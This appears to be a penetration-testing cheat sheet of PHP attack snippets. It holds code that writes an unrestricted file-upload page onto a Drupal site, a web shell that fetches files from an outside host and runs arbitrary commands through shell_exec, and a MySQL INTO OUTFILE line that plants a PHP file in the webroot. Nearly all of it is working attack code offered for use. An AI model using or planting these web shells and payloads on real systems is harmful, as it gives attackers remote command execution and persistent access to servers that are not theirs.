## PHP

Create a file upload page at drupal.site/devel/php
```
$fp = fopen('/var/www/html/', 'w');
fwrite($fp, '<!DOCTYPE html><html><head><title>Upload</title></head><body><form enctype="multipart/form-data" action="upload.php" method="POST"> <p>Choose file</p> <input type="file" name="uploaded_file"></input><br /><input type="submit" value="Upload"></input> </form></body></html><?PHP if(!empty($_FILES[\'uploaded_file\'])) { $path = "./"; $path = $path . basename( $_FILES[\'uploaded_file\'][\'name\']); if(move_uploaded_file($_FILES[\'uploaded_file\'][\'tmp_name\'], $path)) {  echo "The file ". basename( $_FILES[\'uploaded_file\'][\'name\']). " has been uploaded"; } else{ echo "There was an error uploading the file, please try again!"; } }?>');
fclose($fp);
```


### File upload and command execution
If `shell_exec` does not work, try `system`

```php
<?php if (isset($_REQUEST['fupload'])) {
	file_put_contents($_REQUEST['fupload'],
	file_get_contents('http://10.0.0.1/' . $_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
	echo '<pre>' . shell_exec($_REQUEST['fexec']) . '</pre>';
} ?>
```

### Echo IP Address
`<?php echo $_SERVER["REMOTE_ADDR"];`

### MySQL
`SELECT "<?phpinfo()" into OUTFILE "/var/www/html/infox.php"`
